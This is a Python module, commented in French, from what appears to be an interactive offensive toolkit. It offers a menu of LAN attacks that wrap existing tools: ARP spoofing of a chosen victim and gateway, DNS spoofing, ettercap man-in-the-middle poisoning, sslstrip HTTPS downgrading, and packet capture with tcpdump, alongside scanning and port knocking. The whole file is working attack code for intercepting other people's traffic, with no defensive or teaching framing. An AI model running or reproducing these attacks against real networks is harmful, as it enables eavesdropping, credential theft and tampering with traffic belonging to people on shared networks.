"""Réseau LAN : 8 actions — scan, ARP/DNS spoof, MITM, capture."""

from core import ui, runner


def arp_scan():
    ui.header("ARP scan — découverte LAN")
    if not runner.check_tools(["arp-scan"]): ui.pause(); return
    iface = ui.ask("interface", default="eth0")
    runner.run(["arp-scan", "-I", iface, "--localnet"], tag="arp-scan", root=True)
    ui.pause()


def arp_spoof():
    ui.header("ARP spoof — empoisonner cache victime")
    if not runner.check_tools(["arpspoof"]): ui.pause(); return
    iface  = ui.ask("interface", default="eth0")
    victim = ui.ask("IP victime")
    gw     = ui.ask("IP gateway")
    if not (victim and gw): ui.pause(); return
    ui.warn("Active d'abord le forwarding :")
    ui.info("  sudo sysctl -w net.ipv4.ip_forward=1\n")
    runner.run(["arpspoof", "-i", iface, "-t", victim, "-r", gw], tag="arpspoof", root=True)
    ui.pause()


def dns_spoof():
    ui.header("DNS spoof (dnsspoof)")
    if not runner.check_tools(["dnsspoof"]): ui.pause(); return
    iface = ui.ask("interface", default="eth0")
    hf    = ui.ask("fichier hosts (ex: hosts.txt avec '1.2.3.4 example.com')")
    if not hf: ui.pause(); return
    runner.run(["dnsspoof", "-i", iface, "-f", hf], tag="dnsspoof", root=True)
    ui.pause()


def mitm_ettercap():
    ui.header("Ettercap — MITM ARP poisoning texte")
    if not runner.check_tools(["ettercap"]): ui.pause(); return
    iface  = ui.ask("interface", default="eth0")
    target = ui.ask("cible (IP) — vide = tous", default="")
    args = ["ettercap", "-T", "-q", "-i", iface, "-M", "arp:remote"]
    if target:
        args += [f"/{target}//", "//"]
    runner.run(args, tag="ettercap", root=True)
    ui.pause()


def sslstrip():
    ui.header("SSLstrip (HTTPS → HTTP)")
    if not runner.check_tools(["sslstrip"]): ui.pause(); return
    port = ui.ask("port", default="10000")
    runner.run(["sslstrip", "-l", port], tag="sslstrip", root=True)
    ui.info("redirige le trafic HTTP vers ce port (iptables)")
    ui.pause()


def packet_capture():
    ui.header("Capture paquets (tcpdump)")
    iface  = ui.ask("interface", default="eth0")
    filt   = ui.ask("filtre BPF (ex: 'port 80' — vide=tout)", default="")
    out    = ui.ask("fichier .pcap", default="capture.pcap")
    args = ["tcpdump", "-i", iface, "-w", out]
    if filt:
        args += filt.split()
    runner.run(args, tag="tcpdump", root=True)
    ui.pause()


def netbios_scan():
    ui.header("NetBIOS scan (nbtscan)")
    if not runner.check_tools(["nbtscan"]): ui.pause(); return
    rng = ui.ask("plage IP", default="192.168.1.0/24")
    runner.run(["nbtscan", "-r", rng], tag="nbtscan")
    ui.pause()


def port_knock():
    ui.header("Port knocking (séquence de connexion)")
    target = ui.ask("cible (IP)")
    seq    = ui.ask("séquence ports (ex: 7000,8000,9000)")
    if not (target and seq): ui.pause(); return
    for p in seq.split(","):
        p = p.strip()
        ui.info(f"knock → {target}:{p}")
        runner.run(["nmap", "-Pn", "--max-retries", "0", "-p", p, target], tag=f"knock-{p}", stream=False)
    ui.ok("séquence envoyée")
    ui.pause()


ITEMS = [
    ("ARP scan LAN",              arp_scan),
    ("ARP spoof victime",         arp_spoof),
    ("DNS spoof",                 dns_spoof),
    ("MITM ettercap",             mitm_ettercap),
    ("SSLstrip",                  sslstrip),
    ("Capture paquets (tcpdump)", packet_capture),
    ("NetBIOS scan",              netbios_scan),
    ("Port knocking",             port_knock),
]


def menu():
    while True:
        idx = ui.menu("RÉSEAU LAN", ITEMS)
        if idx is None: return
        ITEMS[idx][1]()
